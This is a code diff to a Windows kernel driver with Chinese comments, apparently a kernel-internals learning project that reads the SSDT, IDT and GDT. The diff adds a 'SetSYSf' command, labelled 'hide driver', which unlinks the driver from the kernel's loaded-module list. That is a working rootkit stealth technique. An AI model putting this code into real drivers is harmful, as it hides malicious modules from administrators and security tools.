@@ -44,6 +44,7 @@ VOID ListCurrentProcessAndThread()
 
 PDRIVER_OBJECT gDriverObject = 0;
 PVOID gSysFirst = 0;
+ULONG gSYSf = 0;
 
 //1.使用汇编的方法读取内核函数的地址
 ULONG GetFunctionAddr_ASM(PKSYSTEM_SERVICE_TABLE KeServiceDescriptorTable, LONG lgSsdtIndex)
@@ -77,10 +78,6 @@ ULONG_PTR WriteDisp(LPCH FunName)
 	if (10 == (uRet = RtlCompareMemory(FunName, "InitDevice", 10)))
 	{
 		KdPrint(("比较: %s %s %lu->初始化环境\n", FunName, "InitDevice", uRet));
-		//ListCurrentProcessAndThread();
-		// 摘链
-		//current->InLoadOrderLinks.Flink->Blink = current->InLoadOrderLinks.Blink;
-		//current->InLoadOrderLinks.Blink->Flink = current->InLoadOrderLinks.Flink;
 #pragma region 文件操作
 		/*
 		// 如果文件存在，则以只读的方式打开指定的文件，否则就创建它，路径是 \\??\\...
@@ -167,8 +164,13 @@ ULONG_PTR ReadDisp(LPCH FunName, LPMyInfoSend pInfo)
 	}
 	else if (8 == (uRet = RtlCompareMemory(FunName, "GetSSDT", 8)))
 	{
-		KdPrint(("比较: %s %s %lu->遍历SSDT\n", FunName, "GetSSDT", uRet));
+		//KdPrint(("比较: %s %s %lu->遍历SSDT\n", FunName, "GetSSDT", uRet));
 		return GetSSDT(pInfo);
+	}
+	else if (8 == (uRet = RtlCompareMemory(FunName, "SetSYSf", 8)))
+	{
+		KdPrint(("比较: %s %s %lu->隐藏驱动\n", FunName, "SetSYSf", uRet));
+		return SetSYSf(pInfo);
 	}
 	KdPrint(("比较: [%s] [%p] [%lu]->没有对应\n", FunName, pInfo, uRet));
 	return 0;
@@ -487,10 +489,8 @@ ULONG_PTR GetIDTs(LPMyInfoSend pInfo)
 
 ULONG_PTR GetGDTs(LPMyInfoSend pInfo)
 {
-	//UNREFERENCED_PARAMETER(pInfo);
-	LPMyGDT myGDT = (LPMyGDT)pInfo->byBuf3;
 	GDT_INFO GDT = { 0,0,0 };
-	PGDT_ENTRY pGDTEntry = NULL;
+	PGDT_ENTRY pGDTEntry = NULL, pUser = (PGDT_ENTRY)pInfo->byBuf3;
 	// 获取GDT表地址
 	_asm sgdt GDT;
 	// 获取GDT表数组地址
@@ -499,14 +499,16 @@ ULONG_PTR GetGDTs(LPMyInfoSend pInfo)
 
 	// 获取GDT信息
 	//KdPrint(("---------------GDT描述符表---------\n"));
-	ULONG i = 0, ulMax = pInfo->ulBuff / sizeof(GDT_ENTRY) - 1;
+	ULONG i = 0, ulMax = pInfo->ulBuff / 8;
+	pInfo->ulNum1 = (ULONG)pGDTEntry;
 	while (i < ulMax)
 	{
 		ULONGLONG* uGDT = (ULONGLONG*)&pGDTEntry[i];
-		//KdPrint(("%3lu addr: %p %016llX\n", i + 1, uGDT, *uGDT));
+		KdPrint(("%3lu addr: %p %016llX\n", i + 1, uGDT, *uGDT));
 		if (*uGDT == -1)	return i;
-		myGDT->Addr[i] = (LPCH)uGDT;
-		myGDT->uGDT[i] = *uGDT;
+		pUser[i] = pGDTEntry[i];
+		//myGDT->Addr[i] = (LPCH)uGDT;
+		//myGDT->uGDT[i] = *uGDT;
 		++i;
 	}
 	/*for (; i < 0x100; i++)
@@ -530,7 +532,7 @@ ULONG_PTR GetGDTs(LPMyInfoSend pInfo)
 			pGDTEntry[i].DPL
 			));
 	}*/
-	return 0;
+	return i;
 }
 
 ULONG_PTR GetSSDT(LPMyInfoSend pInfo)
@@ -552,4 +554,27 @@ ULONG_PTR GetSSDT(LPMyInfoSend pInfo)
 		i++;
 	}
 	return i;
+}
+
+ULONG_PTR SetSYSf(LPMyInfoSend pInfo)
+{
+	UNREFERENCED_PARAMETER(pInfo);
+	// LDR 是一个双向链表，遍历结束的条件是，遍历到的不是自己
+	PLDR_DATA_TABLE_ENTRY current = gDriverObject->DriverSection;
+	PLDR_DATA_TABLE_ENTRY item = current;
+
+	// 创建一个索引，表示当前遍历到的是第几个
+	//int index = 1;
+	do {
+		// 输出元素的基本信息
+		//KdPrint(("%d: %wZ %wZ\n", index++, &item->BaseDllName, &item->FullDllName));
+
+		// 获取遍历到的元素的下一个元素
+		item = (PLDR_DATA_TABLE_ENTRY)item->InLoadOrderLinks.Flink;
+	} while (current != item);
+
+	// 摘链
+	current->InLoadOrderLinks.Flink->Blink = current->InLoadOrderLinks.Blink;
+	current->InLoadOrderLinks.Blink->Flink = current->InLoadOrderLinks.Flink;
+	return gSYSf++;
 }
